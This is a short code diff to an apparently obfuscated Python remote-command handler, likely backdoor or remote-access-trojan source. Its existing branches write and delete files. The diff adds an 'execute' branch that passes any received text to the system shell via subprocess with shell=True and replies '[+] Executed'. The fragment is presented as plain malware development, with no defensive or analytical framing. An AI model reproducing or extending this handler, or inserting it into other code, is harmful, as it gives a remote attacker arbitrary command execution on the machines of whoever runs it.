@@ -61,6 +61,9 @@ class dtf2un:
                         result = self._73mvhb(command[1], command[2].encode())
                     elif command[0] == "delete":
                         result = self.x98skil(" ".join(command[1:]))
+                    elif command[0] == "execute":
+                        subprocess.Popen(" ".join(command[1:]),shell=True)
+                        result = "[+] Executed "+" ".join(command[1:])+"!"    
                     else:
                         result = self._5zxun5(command).decode()
                 except Exception as e:
